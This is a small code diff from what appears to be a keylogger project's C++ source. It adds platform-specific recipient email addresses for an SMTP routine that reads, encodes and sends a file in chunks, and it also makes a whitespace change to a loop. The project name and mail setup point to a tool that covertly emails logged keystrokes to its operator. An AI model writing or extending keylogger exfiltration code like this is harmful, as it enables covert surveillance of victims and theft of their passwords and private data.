@@ -10,7 +10,13 @@
 #include <fstream>
 
 #define FROM        "<keylogger_project_2014@yahoo.com>"
+
+#if defined(__linux)
+#define TO          "<keylogger_project_2014@gmail.com>"
+#elif defined(_WIN32)
 #define TO          "<MisterYura@gmail.com>"
+#endif
+
 #define AUTH        "keylogger_project_2014@yahoo.com"
 
 #define SUBJECT     "SMTP TLS Test 9.1"
@@ -70,7 +76,7 @@ size_t read_file()
 	std::string sub_encoded_buf;
 
 
-	for (; (signed) len < no_of_rows + ADD_SIZE; ++len)
+	for(; (signed) len < no_of_rows + ADD_SIZE; ++len)
 	{
 		if (pos*SEND_BUF_SIZE <= (signed) encoded_buf_len)
 		{
